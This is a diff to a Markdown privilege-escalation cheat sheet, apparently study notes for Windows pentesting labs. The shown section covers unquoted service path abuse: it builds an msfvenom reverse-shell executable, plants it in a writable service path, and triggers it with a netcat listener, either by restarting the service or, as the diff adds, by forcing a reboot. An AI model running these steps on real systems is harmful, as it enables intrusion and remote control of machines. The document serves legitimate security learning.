@@ -75,7 +75,7 @@
   ```
  6.`msfvenom -p windows/shell_reverse_tcp LHOST=myIP LPORT=LISTENINGPORT -f exe  -o Program.exe` (Name payload accordingly to the path writable)\
  7. `copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"` copy file
- 8. start a netcat listenr, and `net start <SERVICENAME>`
+ 8. start a netcat listenr, and `net start <SERVICENAME>` or `shutdown /f /r /t 0`
  
  ### Weak Registery Permissions (Modify service registry)
 1. Same winPeas command as above.
